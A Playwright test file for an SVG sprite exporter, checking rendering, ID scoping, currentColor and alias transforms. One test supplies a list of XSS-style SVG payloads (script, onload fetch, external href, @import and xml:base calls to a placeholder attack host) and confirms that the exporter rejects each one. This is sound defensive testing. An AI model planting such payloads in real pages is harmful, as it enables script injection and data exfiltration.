import type { Locator, Page, TestInfo } from '@playwright/test'
import { createHash } from 'node:crypto'
import { mkdir, readdir, readFile, writeFile } from 'node:fs/promises'
import { createServer } from 'node:http'
import { join } from 'node:path'
import { emptyIconSet, exportOutputs, IconctlError, resolveConfig, sync } from '@iconctl/core'
import { test as base, expect } from '@playwright/test'

type IconData = Parameters<ReturnType<typeof emptyIconSet>['load']>[0]
type Mode = 'inline' | 'external'
type Color = [number, number, number, number]
interface Example { name: string, symbol: string, width: number, height: number, color?: string }
interface Rendered { width: number, height: number, pixels: number[], samples: Color[] }
interface SpriteHost {
  origin: string
  publish: (file: string, examples: Example[]) => void
  open: (mode: Mode) => Promise<void>
}
const hash = (value: string | Uint8Array) => createHash('sha256').update(value).digest('hex')
const escaped = (value: string) => value.replaceAll('&', '&amp;').replaceAll('"', '&quot;').replaceAll('<', '&lt;').replaceAll('>', '&gt;')
const white: Color = [255, 255, 255, 255]
const green: Color = [20, 140, 60, 255]
const corners = [[0.125, 0.125], [0.875, 0.125], [0.125, 0.875], [0.875, 0.875]] as const
const picture = (page: Page, name: string) => page.getByRole('img', { name, exact: true })

function html(mode: Mode, sprite: string, examples: Example[]) {
  const figures = examples.map(example => `<figure data-example="${escaped(example.name)}" style="color:${example.color ?? 'rgb(20,140,60)'}"><figcaption>${escaped(example.name)}</figcaption><svg role="img" aria-label="${escaped(example.name)}" width="${example.width * 4}" height="${example.height * 4}"><use href="${mode === 'external' ? '/icons.svg' : ''}#${escaped(example.symbol)}" width="100%" height="100%"/></svg></figure>`).join('')
  return `<!doctype html><html lang="en"><meta charset="utf-8"><title>Sprite ${mode}</title><style>body{margin:24px;background:white;font-family:Arial,sans-serif}main{display:flex;flex-wrap:wrap;gap:24px;align-items:flex-start}figure{margin:0}figcaption{margin-bottom:8px;font-size:14px}svg[role=img]{display:block;background:white}#sprite-source{position:absolute;width:0;height:0;overflow:hidden}</style><body>${mode === 'inline' ? `<div id="sprite-source">${sprite}</div>` : ''}<main>${figures}</main></body></html>`
}

// The resource response is read from the public API's committed file. External
// pages never contain inline symbols that could accidentally satisfy a reference.
const test = base.extend<{ spriteHost: SpriteHost }>({
  spriteHost: async ({ page }, use, info) => {
    let file = ''
    let examples: Example[] = []
    const requests: string[] = []
    const unexpected: string[] = []
    const errors: string[] = []
    const dialogs: string[] = []
    const responses: { path: string, status: number, bytes: number, sha256?: string }[] = []
    const server = createServer((request, response) => {
      void (async () => {
        const path = new URL(request.url!, 'http://localhost').pathname
        if (path === '/favicon.ico') {
          response.writeHead(204).end()
          return
        }
        if (!file || !['/inline', '/external', '/icons.svg'].includes(path)) {
          errors.push(`Unexpected local resource ${path}`)
          response.writeHead(404).end()
          return
        }
        const sprite = await readFile(file)
        const content = path === '/icons.svg' ? sprite : html(path.slice(1) as Mode, sprite.toString('utf8'), examples)
        const bytes = typeof content === 'string' ? new TextEncoder().encode(content) : content
        responses.push({ path, status: 200, bytes: bytes.length, sha256: hash(bytes) })
        response.writeHead(200, { 'Content-Type': path === '/icons.svg' ? 'image/svg+xml; charset=utf-8' : 'text/html; charset=utf-8', 'Cache-Control': 'no-store' }).end(content)
      })().catch((error) => {
        errors.push(String(error))
        response.writeHead(500).end()
      })
    })
    await new Promise<void>((resolve, reject) => {
      server.once('error', reject)
      server.listen(0, '127.0.0.1', resolve)
    })
    const address = server.address()
    if (!address || typeof address === 'string') {
      throw new Error('The sprite fixture did not allocate a TCP port')
    }
    const origin = `http://127.0.0.1:${address.port}`
    try {
      await page.addInitScript(() => Object.assign(window, { spriteCompromised: false }))
      await page.route('**/*', async (route) => {
        const url = new URL(route.request().url())
        if (url.origin === origin && ['/inline', '/external', '/icons.svg', '/favicon.ico'].includes(url.pathname)) {
          await route.continue()
        }
        else {
          unexpected.push(route.request().url())
          await route.abort('blockedbyclient')
        }
      })
      page.on('request', request => requests.push(request.url()))
      page.on('pageerror', error => errors.push(error.message))
      page.on('dialog', (dialog) => {
        dialogs.push(dialog.message())
        void dialog.dismiss()
      })
      await use({
        origin,
        publish: (nextFile, nextExamples) => {
          file = nextFile
          examples = nextExamples
        },
        open: async (mode) => {
          const served = mode === 'external' ? page.waitForResponse(`${origin}/icons.svg`) : undefined
          await page.goto(`${origin}/${mode}`)
          await expect(page).toHaveTitle(`Sprite ${mode}`)
          await expect(page.locator('#sprite-source symbol')).toHaveCount(mode === 'external' ? 0 : new Set(examples.map(example => example.symbol)).size)
          if (served) {
            const response = await served
            expect(response.status()).toBe(200)
            expect(response.headers()['content-type']).toBe('image/svg+xml; charset=utf-8')
            expect(hash(await response.body())).toBe(hash(await readFile(file)))
          }
          for (const example of examples) {
            await expect.poll(() => picture(page, example.name).evaluate((svg: SVGSVGElement) => svg.getBBox().width)).toBeGreaterThan(0)
          }
          await page.evaluate(() => new Promise<void>(resolve => requestAnimationFrame(() => requestAnimationFrame(() => resolve()))))
        },
      })
      expect(unexpected).toEqual([])
      expect(errors).toEqual([])
      expect(dialogs).toEqual([])
      expect(await page.evaluate(() => (window as unknown as { spriteCompromised: boolean }).spriteCompromised)).toBe(false)
      await expect(page.locator('script, img, foreignObject, iframe')).toHaveCount(0)
    }
    finally {
      await writeFile(info.outputPath('sprite-http-evidence.json'), JSON.stringify({ origin, requests, responses, unexpected, errors, dialogs }, null, 2))
      await new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve()))
      expect(server.listening).toBe(false)
    }
  },
})

function configuration() {
  return resolveConfig({ prefix: 'brand', sources: [{ type: 'directory', dir: 'unused-by-export' }], color: false, output: { json: 'icons.json', sprite: 'icons.svg', types: 'icons.d.ts' } })
}
async function exported(info: TestInfo, data: IconData, directory = 'public-output') {
  const cwd = info.outputPath(directory)
  await mkdir(cwd, { recursive: true })
  const set = emptyIconSet('brand')
  set.load(data)
  const before = structuredClone(set.export())
  const result = await exportOutputs(set, configuration(), { cwd })
  expect(set.export()).toEqual(before)
  expect(result.files).toContain(join(cwd, 'icons.svg'))
  return { cwd, file: join(cwd, 'icons.svg'), set }
}

async function pixels(page: Page, element: Locator, info: TestInfo, name: string, points: readonly (readonly [number, number])[] = corners): Promise<Rendered> {
  const png = await element.screenshot({ path: info.outputPath(`${name}.png`), animations: 'disabled' })
  // Decode the browser's actual screenshot. No SVG-as-image canvas fallback:
  // that path disables external <use> resources and cannot verify this feature.
  return page.evaluate(async ({ encoded, points }) => {
    const image = new Image()
    image.src = `data:image/png;base64,${encoded}`
    await image.decode()
    const canvas = document.createElement('canvas')
    canvas.width = image.naturalWidth
    canvas.height = image.naturalHeight
    const context = canvas.getContext('2d')!
    context.drawImage(image, 0, 0)
    const pixels = [...context.getImageData(0, 0, canvas.width, canvas.height).data]
    const samples = points.map(([x, y]) => {
      const offset = (Math.floor(y * canvas.height) * canvas.width + Math.floor(x * canvas.width)) * 4
      return pixels.slice(offset, offset + 4) as Color
    })
    return { width: canvas.width, height: canvas.height, pixels, samples }
  }, { encoded: png.toString('base64'), points })
}
async function inspectSprite(page: Page, file: string) {
  const source = await readFile(file, 'utf8')
  return page.evaluate((source) => {
    const document = new DOMParser().parseFromString(source, 'image/svg+xml')
    const errors = [...document.querySelectorAll('parsererror')].map(node => node.textContent)
    const ids = [...document.querySelectorAll('[id]')].map(node => node.id)
    const symbols = [...document.querySelectorAll('symbol')].map((symbol) => {
      const localIds = new Set([...symbol.querySelectorAll('[id]')].map(node => node.id))
      localIds.add(symbol.id)
      const references: { attribute: string, target: string, local: boolean }[] = []
      for (const node of [symbol, ...symbol.querySelectorAll('*')]) {
        for (const attribute of node.attributes) {
          const value = attribute.value
          const targets = attribute.localName === 'href'
            ? [value.slice(1)]
            : value.startsWith('url(#')
              ? [value.slice(5, -1)]
              : ['aria-labelledby', 'aria-describedby'].includes(attribute.name) ? value.split(' ') : []
          references.push(...targets.map(target => ({ attribute: attribute.name, target, local: localIds.has(target) })))
        }
      }
      return { id: symbol.id, viewBox: symbol.getAttribute('viewBox'), references }
    })
    const textSymbol = document.getElementById('iconctl-brand-text')
    const mixed = textSymbol?.querySelector('[data-kind="mixed"]')
    return {
      errors,
      ids,
      symbols,
      text: textSymbol
        ? {
            label: textSymbol.querySelector('[data-label]')?.getAttribute('data-label'),
            whitespace: textSymbol.querySelector('[data-whitespace]')?.getAttribute('data-whitespace'),
            mixed: mixed?.textContent,
            children: mixed ? [...mixed.childNodes].map(node => ({ type: node.nodeType, text: node.textContent })) : [],
            cdata: textSymbol.querySelector('[data-kind="cdata"]')?.textContent,
            literal: textSymbol.querySelector('desc')?.textContent,
            hostileTitle: textSymbol.querySelector('title')?.textContent,
          }
        : undefined,
    }
  }, source)
}

function repeatedDefinitions(color: string, clipX: number) {
  return `<title id = 'title'>Repeated definitions</title><defs><linearGradient id = 'paint'><stop offset='0' stop-color='${color}'/><stop offset='1' stop-color='${color}'/></linearGradient><linearGradient id = 'inherited' href = '&#35;paint'/><clipPath id = 'clip'><rect x='${clipX}' width='12' height='24'/></clipPath><rect id = 'shape' width='24' height='24'/></defs><use xlink:href = '&#35;shape' fill = 'url(&quot;&#35;inherited&quot;)' clip-path = 'url( &#35;clip )' aria-labelledby = 'title'/>`
}

test('renders independently scoped definitions and currentColor inline and over HTTP while preserving strict XML text and entities', async ({ page, spriteHost }, info) => {
  const literalTitle = '<img src="https://sprite-attack.invalid/literal" onerror="alert(1)">'
  const data: IconData = {
    prefix: 'brand',
    width: 24,
    height: 24,
    lastModified: 1700000000,
    icons: {
      'first': { body: repeatedDefinitions('#e02030', 0) },
      'second': { body: repeatedDefinitions('#2040d0', 12) },
      'first-id-0': { body: '<rect width="24" height="24" fill="currentColor"/>' },
      'tone': { body: '<rect x="4" y="4" width="16" height="16" fill="currentColor"/>' },
      'text': { width: 240, height: 64, body: `<title>&lt;img src=&quot;https://sprite-attack.invalid/literal&quot; onerror=&quot;alert(1)&quot;&gt;</title><desc>&amp;quot; is literal</desc><g data-label = 'A > B &amp; "C"' data-whitespace = 'A&#9;B&#10;C&#13;D'><text data-kind='mixed' x='4' y='20' xml:space = 'preserve'> A <tspan>B &amp; C</tspan> D </text><text data-kind='cdata' x='4' y='44'><![CDATA[A < B & C]]></text></g>` },
    },
  }
  const output = await exported(info, data)
  const initial = await readFile(output.file)
  await exportOutputs(output.set, configuration(), { cwd: output.cwd })
  expect(await readFile(output.file)).toEqual(initial)
  const examples: Example[] = [
    ...['first', 'second', 'first-id-0'].map(name => ({ name, symbol: `iconctl-brand-${name}`, width: 24, height: 24 })),
    { name: 'tone-blue', symbol: 'iconctl-brand-tone', width: 24, height: 24, color: 'rgb(12,100,180)' },
    { name: 'tone-orange', symbol: 'iconctl-brand-tone', width: 24, height: 24, color: 'rgb(180,70,20)' },
    { name: 'text', symbol: 'iconctl-brand-text', width: 240, height: 64 },
  ]
  spriteHost.publish(output.file, examples)
  const rendered = new Map<string, Rendered>()
  for (const mode of ['inline', 'external'] as const) {
    await spriteHost.open(mode)
    const document = await inspectSprite(page, output.file)
    expect(document.errors).toEqual([])
    expect(new Set(document.ids).size).toBe(document.ids.length)
    expect(document.symbols).toHaveLength(5)
    expect(document.symbols.flatMap(symbol => symbol.references).every(reference => reference.local)).toBe(true)
    expect(document.text).toEqual({ label: 'A > B & "C"', whitespace: 'A\tB\nC\rD', mixed: ' A B & C D ', children: [{ type: 3, text: ' A ' }, { type: 1, text: 'B & C' }, { type: 3, text: ' D ' }], cdata: 'A < B & C', literal: '&quot; is literal', hostileTitle: literalTitle })
    if (mode === 'inline') {
      expect(await page.locator('#sprite-source [data-kind="mixed"]').textContent()).toBe(' A B & C D ')
      expect(await page.locator('#sprite-source [data-whitespace]').getAttribute('data-whitespace')).toBe('A\tB\nC\rD')
    }
    for (const example of examples) {
      const result = await pixels(page, picture(page, example.name), info, `${mode}-${example.name}`, example.name.startsWith('tone-') ? [[0.5, 0.5]] : corners)
      if (example.name === 'first') {
        expect(result.samples).toEqual([[224, 32, 48, 255], white, [224, 32, 48, 255], white])
      }
      if (example.name === 'second') {
        expect(result.samples).toEqual([white, [32, 64, 208, 255], white, [32, 64, 208, 255]])
      }
      if (example.name === 'first-id-0') {
        expect(result.samples).toEqual([green, green, green, green])
      }
      if (example.name === 'tone-blue') {
        expect(result.samples).toEqual([[12, 100, 180, 255]])
      }
      if (example.name === 'tone-orange') {
        expect(result.samples).toEqual([[180, 70, 20, 255]])
      }
      if (example.name === 'text') {
        expect(result.pixels.filter((value, index) => index % 4 !== 3 && value < 200).length).toBeGreaterThan(100)
      }
      if (mode === 'inline') {
        rendered.set(example.name, result)
      }
      else {
        expect(result).toEqual(rendered.get(example.name))
      }
    }
    await picture(page, 'tone-blue').evaluate(svg => svg.parentElement!.style.color = 'rgb(70,150,30)')
    const recolored = await pixels(page, picture(page, 'tone-blue'), info, `${mode}-current-color-updated`, [[0.5, 0.5]])
    expect(recolored.samples).toEqual([[70, 150, 30, 255]])
    await writeFile(info.outputPath(`${mode}-sprite-dom.json`), JSON.stringify(document, null, 2))
    await page.screenshot({ path: info.outputPath(`${mode}-sprite-gallery.png`), fullPage: true })
  }
})

test('preserves nonsquare viewports, nonzero origins and alias transforms through public export and local Iconify sync', async ({ page, spriteHost }, info) => {
  const data: IconData = {
    prefix: 'brand',
    width: 32,
    height: 16,
    left: -2,
    top: 3,
    lastModified: 1700000000,
    icons: { base: { body: '<path fill="currentColor" d="M-2 3h8v4h-8z"/>' } },
    aliases: { plain: { parent: 'base' }, rotated: { parent: 'base', rotate: 1 }, flipped: { parent: 'base', hFlip: true }, vertical: { parent: 'base', vFlip: true } },
  }
  const exportedOutput = await exported(info, data)
  const cwd = info.outputPath('sync-output')
  await mkdir(cwd, { recursive: true })
  await writeFile(join(cwd, 'source.json'), JSON.stringify(data))
  const config = resolveConfig({ prefix: 'brand', sources: [{ type: 'iconify', file: 'source.json' }], color: false, output: { json: 'icons.json', sprite: 'icons.svg', types: 'icons.d.ts' } })
  const result = await sync({ cwd, config })
  expect(result.complete).toBe(true)
  expect(result.failed).toEqual([])
  expect(result.files).toContain(join(cwd, 'icons.svg'))
  const names = ['base', 'plain', 'rotated', 'flipped', 'vertical']
  const examples = names.map(name => ({ name, symbol: `iconctl-brand-${name}`, width: name === 'rotated' ? 16 : 32, height: name === 'rotated' ? 32 : 16 }))
  const expected = { base: [green, white, white, white], plain: [green, white, white, white], rotated: [white, green, white, white], flipped: [white, green, white, white], vertical: [white, white, green, white] }
  const reference = new Map<string, Rendered>()
  for (const [pipeline, file] of [['export', exportedOutput.file], ['sync', join(cwd, 'icons.svg')]] as const) {
    spriteHost.publish(file, examples)
    for (const mode of ['inline', 'external'] as const) {
      await spriteHost.open(mode)
      const document = await inspectSprite(page, file)
      expect(document.errors).toEqual([])
      expect(document.symbols.map(symbol => symbol.id)).toEqual([...names].sort().map(name => `iconctl-brand-${name}`))
      if (pipeline === 'export') {
        expect(document.symbols.find(symbol => symbol.id === 'iconctl-brand-base')?.viewBox).toBe('-2 3 32 16')
        expect(document.symbols.find(symbol => symbol.id === 'iconctl-brand-rotated')?.viewBox).toBe('3 -2 16 32')
      }
      for (const name of names) {
        const rendered = await pixels(page, picture(page, name), info, `${pipeline}-${mode}-${name}`)
        expect(rendered.samples, `${pipeline}/${mode}/${name}`).toEqual(expected[name as keyof typeof expected])
        if (pipeline === 'export' && mode === 'inline') {
          reference.set(name, rendered)
        }
        else {
          expect(rendered).toEqual(reference.get(name))
        }
      }
      await writeFile(info.outputPath(`${pipeline}-${mode}-sprite-dom.json`), JSON.stringify(document, null, 2))
      await page.screenshot({ path: info.outputPath(`${pipeline}-${mode}-transforms.png`), fullPage: true })
    }
  }
})

test('rejects malicious or ambiguous XML before replacing committed artifacts and renders the preserved sprite without network side effects', async ({ page, spriteHost }, info) => {
  const output = await exported(info, { prefix: 'brand', width: 24, height: 24, icons: { safe: { body: '<rect width="24" height="24" fill="currentColor"/>' } } })
  const files = await readdir(output.cwd)
  const before = Object.fromEntries(await Promise.all(files.map(async file => [file, hash(await readFile(join(output.cwd, file)))])))
  const attacks = [
    '<script>window.spriteCompromised=true;fetch("https://sprite-attack.invalid/script")</script>',
    '<path onload = \'window.spriteCompromised=true;fetch("https://sprite-attack.invalid/event")\'/>',
    '<image href = \'&#104;ttps://sprite-attack.invalid/image\'/>',
    '<path fill = \'url(https://sprite-attack.invalid/paint)\'/>',
    '<style>@import url("https://sprite-attack.invalid/style");</style>',
    '<foreignObject><img xmlns="http://www.w3.org/1999/xhtml" src="https://sprite-attack.invalid/foreign"/></foreignObject>',
    '<g xml:base="https://sprite-attack.invalid/"><path id="shape"/><use href="#shape"/></g>',
    '<use href="#only-in-other-icon"/>',
    '<path id="same"/><path id = \'&#115;ame\'/>',
    '<path fill="red" fill="blue"/>',
    '<path xml:id="shared"/>',
    '<?xml-stylesheet href="https://sprite-attack.invalid/processing"?>',
  ]
  const failures: { input: string, error: string }[] = []
  for (const body of attacks) {
    const set = emptyIconSet('brand')
    set.load({ prefix: 'brand', width: 24, height: 24, icons: { attack: { body }, other: { body: '<path id="only-in-other-icon"/>' } } })
    const error: unknown = await exportOutputs(set, configuration(), { cwd: output.cwd }).then(() => undefined, error => error)
    expect(error).toBeInstanceOf(IconctlError)
    expect((error as Error).message).toContain('brand:attack')
    failures.push({ input: body, error: (error as Error).message })
    expect(await readdir(output.cwd)).toEqual(files)
    for (const file of files) {
      expect(hash(await readFile(join(output.cwd, file))), file).toBe(before[file])
    }
  }
  await writeFile(info.outputPath('sprite-rejected-inputs.json'), JSON.stringify({ failures, preservedHashes: before }, null, 2))
  spriteHost.publish(output.file, [{ name: 'safe', symbol: 'iconctl-brand-safe', width: 24, height: 24 }])
  for (const mode of ['inline', 'external'] as const) {
    await spriteHost.open(mode)
    const rendered = await pixels(page, picture(page, 'safe'), info, `${mode}-preserved`)
    expect(rendered.samples).toEqual([green, green, green, green])
    await expect(page.locator('[onload], [onerror], [xml\\:base]')).toHaveCount(0)
  }
})
